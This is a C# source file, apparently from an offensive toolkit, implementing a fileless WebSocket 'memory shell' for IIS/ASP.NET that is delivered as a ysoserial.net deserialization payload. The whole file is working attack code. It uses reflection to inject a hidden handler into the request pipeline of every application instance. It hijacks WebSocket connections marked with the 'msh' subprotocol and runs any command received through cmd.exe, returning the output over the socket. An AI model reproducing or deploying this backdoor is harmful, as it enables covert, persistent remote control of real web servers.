// payloads/WsTakeoverShell.cs
// ---------------------------------------------------------------------------
// Memory shell #2: WebSocket connection takeover (the .NET port of the WebSocket
// memory-shell idea: take the connection away from request/response processing).
//
// Insertion point : the HTTP -> WebSocket upgrade transition. The shell rides the site's
//                   existing 80/443 endpoints (no new port, no http.sys registration).
// Trigger         : a WebSocket handshake whose Sec-WebSocket-Protocol contains "msh".
// Impact          : non-handshake requests are a strict no-op; only the marked connection
//                   is upgraded to a full-duplex command channel.
// Compiled by     : ysoserial.net -g XamlAssemblyLoadFromFile
//                   -c "payloads\WsTakeoverShell.cs;System.dll;System.Web.dll"
// Environment     : IIS integrated pipeline + WebSocket feature enabled (both are the
//                   common defaults on Server 2012+); AcceptWebSocketRequest throws otherwise.
// ---------------------------------------------------------------------------

using System;
using System.Diagnostics;
using System.Net.WebSockets;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Web;
using System.Web.WebSockets;

public class E
{
    private const string MagicSubprotocol = "msh";
    private static readonly System.Collections.ArrayList _done = new System.Collections.ArrayList();

    public E()
    {
        try { Install(); } catch { }
    }

    private static void Install()
    {
        try
        {
            HttpContext ctx = HttpContext.Current;
            if (ctx != null && ctx.ApplicationInstance != null)
                InstallOne(ctx.ApplicationInstance);
        }
        catch { }
        try
        {
            Type ft = typeof(HttpApplication).Assembly.GetType("System.Web.HttpApplicationFactory");
            FieldInfo ff = ft.GetField("_theApplicationFactory", BindingFlags.Static | BindingFlags.NonPublic);
            object factory = ff.GetValue(null);
            FieldInfo fl = ft.GetField("_freeList", BindingFlags.Instance | BindingFlags.NonPublic);
            foreach (object o in (System.Collections.IEnumerable)fl.GetValue(factory))
                InstallOne((HttpApplication)o);
        }
        catch { }
    }

    private static void InstallOne(HttpApplication app)
    {
        if (app == null || _done.Contains(app)) return;
        if (InstallIntegrated(app) || InstallClassic(app)) _done.Add(app);
    }

    private static bool InstallIntegrated(HttpApplication app)
    {
        try
        {
            BindingFlags F = BindingFlags.Instance | BindingFlags.NonPublic;
            Type t = typeof(HttpApplication);

            MethodInfo getC = t.GetMethod("GetModuleContainer", F);
            if (getC == null) return false;

            object container = null;
            FieldInfo mcF = t.GetField("_moduleCollection", F);
            object mc = mcF != null ? mcF.GetValue(app) : null;
            if (mc != null)
            {
                string[] keys = (string[])mc.GetType().GetProperty("AllKeys").GetValue(mc, null);
                foreach (string k in keys)
                {
                    try { container = getC.Invoke(app, new object[] { k }); }
                    catch { }
                    if (container != null) break;
                }
            }
            if (container == null) return false;

            object step = BuildStep(app);
            if (step == null) return false;

            MethodInfo addEvent = null;
            foreach (MethodInfo mi in container.GetType().GetMethods(F))
                if (mi.Name == "AddEvent") { addEvent = mi; break; }
            if (addEvent == null) return false;

            addEvent.Invoke(container, new object[] { RequestNotification.BeginRequest, false, step });
            return true;
        }
        catch { return false; }
    }

    private static bool InstallClassic(HttpApplication app)
    {
        try
        {
            BindingFlags F = BindingFlags.Instance | BindingFlags.NonPublic;
            Type t = typeof(HttpApplication);

            object step = BuildStep(app);
            if (step == null) return false;

            object sm = t.GetField("_stepManager", F).GetValue(app);
            FieldInfo esF = sm.GetType().GetField("_execSteps", F);
            if (esF == null) return false;

            Array old = (Array)esF.GetValue(sm);
            int n = old.Length;
            Array neu = Array.CreateInstance(old.GetType().GetElementType(), n + 1);
            Array.Copy(old, neu, n);
            neu.SetValue(step, n);
            esF.SetValue(sm, neu);
            return true;
        }
        catch { return false; }
    }

    private static object BuildStep(HttpApplication app)
    {
        Type t = typeof(HttpApplication);
        Type stepType = t.GetNestedType("SyncEventExecutionStep", BindingFlags.NonPublic);
        if (stepType == null) return null;
        ConstructorInfo ctor = stepType.GetConstructor(
            BindingFlags.NonPublic | BindingFlags.Instance, null,
            new Type[] { typeof(HttpApplication), typeof(EventHandler) }, null);
        if (ctor == null) return null;
        return ctor.Invoke(new object[] { app, new EventHandler(OnRequest) });
    }

    private static void OnRequest(object sender, EventArgs e)
    {
        try
        {
            HttpContext ctx = HttpContext.Current;
            if (ctx == null || !ctx.IsWebSocketRequest) return;
            string proto = ctx.Request.Headers["Sec-WebSocket-Protocol"];
            if (proto == null || proto.IndexOf(MagicSubprotocol, StringComparison.OrdinalIgnoreCase) < 0) return;

            // Connection takeover: the request pipeline terminates here and the upgraded
            // duplex stream is owned by Duplex() for the lifetime of the connection.
            ctx.AcceptWebSocketRequest(Duplex);
        }
        catch { }
    }

    private static Task Duplex(AspNetWebSocketContext c)
    {
        WebSocket ws = c.WebSocket;
        byte[] buf = new byte[65536];
        while (ws.State == WebSocketState.Open)
        {
            WebSocketReceiveResult r =
                ws.ReceiveAsync(new ArraySegment<byte>(buf), CancellationToken.None).GetAwaiter().GetResult();
            if (r.MessageType == WebSocketMessageType.Close)
            {
                ws.CloseAsync(WebSocketCloseStatus.NormalClosure, "bye", CancellationToken.None).GetAwaiter().GetResult();
                break;
            }
            string cmd = Encoding.UTF8.GetString(buf, 0, r.Count);
            byte[] outb = Encoding.UTF8.GetBytes(Exec(cmd) ?? "");
            ws.SendAsync(new ArraySegment<byte>(outb), WebSocketMessageType.Text, true,
                CancellationToken.None).GetAwaiter().GetResult();
        }
        return Task.FromResult(0);
    }

    private static string Exec(string cmd)
    {
        try
        {
            ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c " + cmd);
            psi.UseShellExecute = false;
            psi.RedirectStandardOutput = true;
            psi.RedirectStandardError = true;
            psi.CreateNoWindow = true;
            using (Process p = Process.Start(psi))
            {
                string o = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
                p.WaitForExit();
                return o;
            }
        }
        catch (Exception ex) { return ex.Message; }
    }
}
